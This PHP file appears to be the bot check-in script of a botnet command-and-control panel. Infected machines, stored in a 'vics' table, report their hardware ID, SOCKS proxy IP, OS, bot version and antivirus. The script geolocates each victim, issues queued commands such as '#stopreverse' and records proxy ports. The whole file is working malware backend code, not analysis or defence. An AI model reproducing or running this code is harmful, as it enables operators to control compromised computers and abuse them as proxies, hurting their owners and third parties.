<?php

include("admin/inc/config.php");
include("admin/inc/functions.php");
require_once("geoipcity.inc");

global $sql;
global $ccode;

if(isset($_GET['mode']) && $_GET['mode'] == "con")
{
	//hwid, socksip, osversion, version, antivir
	if(!empty($_POST['hwid']) && !empty($_POST['socksip']) && !empty($_POST['osversion']) && !empty($_POST['version']) && !empty($_POST['antivir']))
	{
		
		$hwid = esc($_POST['hwid']);
		$realip = esc($_SERVER['REMOTE_ADDR']);
		$socksip = esc($_POST['socksip']);
		$osversion = esc($_POST['osversion']);
		$botver = esc($_POST['version']);
		if(!empty($_POST['antivir']))
		{
			$antivir = esc($_POST['antivir']);
		}
		else
		{
			$antivir = 'No Antivir';
		}
		
		
		$gi = geoip_open("GeoLiteCity.dat", GEOIP_STANDARD);
		
		$ip = $realip;
		
		$record = geoip_record_by_addr($gi, $ip);
		
		if(!$record)
		{
			$country = 'No Country';
			$countryshort = '00';
			$city = 'No City';
		}
		else
		{
			$country = $record->country_name;
			$countryshort = strtolower($record->country_code);
			$city = $record->city;
		}
		
		geoip_close($gi);
		
		$sql_test = mysql_query("SELECT hwid FROM vics WHERE hwid = '".$hwid."' LIMIT 1");
		
		if(mysql_num_rows($sql_test) <= 0)
		{		
			$sql_insert = "INSERT INTO vics
						(hwid, realip, country, countryshort, city, install, lastcon, socksip, osversion, antivir, botver)
						VALUES
						('".$hwid."', '".$realip."', '".$country."', '".$countryshort."', '".$city."', '".time()."', '".time()."', '".$socksip."', '".$osversion."', '".$antivir."', '".$botver."')";
		
			if(!mysql_query($sql_insert))
			{
				echo mysql_errno()." - ".mysql_error();
			}
		}
		else
		{
			
			$sql = mysql_query("SELECT command FROM vics WHERE hwid = '".$hwid."' LIMIT 1");
			$res = mysql_fetch_array($sql);
			echo $res['command'];
			if($res['command'] == '#stopreverse')
			{
				$sql_update = "UPDATE vics SET active = 0, command = '' WHERE hwid = '".$hwid."'";	
				if(!mysql_query($sql_update))
				{
					echo mysql_errno()." - ".mysql_error();
				}
			}
			else
			{
				$sql_update = "UPDATE vics SET command = '' WHERE hwid = '".$hwid."'";	
				if(!mysql_query($sql_update))
				{
					echo mysql_errno()." - ".mysql_error();
				}
			}
			
			$sql_insert = "UPDATE vics SET
						realip = '".$realip."',
						lastcon = '".time()."',
						socksip = '".$socksip."',
						osversion = '".$osversion."',
						antivir = '".$antivir."',
						botver = '".$botver."'
						WHERE hwid = '".$hwid."'";
						
						
		
			if(!mysql_query($sql_insert))
			{
				echo mysql_errno()." - ".mysql_error();
			}
		}
	}
}
elseif(isset($_GET['mode']) && $_GET['mode'] == 'proxy')
{
	//socksport, httpport
	if(!empty($_POST['hwid']) && !empty($_POST['socksport']) && !empty($_POST['httpport']))
	{
		$hwid = esc($_POST['hwid']);
		$socksport = esc($_POST['socksport']);
		$httpport = esc($_POST['httpport']);
		
		$sql_update = "UPDATE vics SET
						socksport = '".$socksport."',
						httpport = '".$httpport."',
						command = ''
						WHERE hwid = '".$hwid."'";
		
		if(!mysql_query($sql_update))
		{
			echo mysql_errno()." - ".mysql_error();
		}
	}
}

?>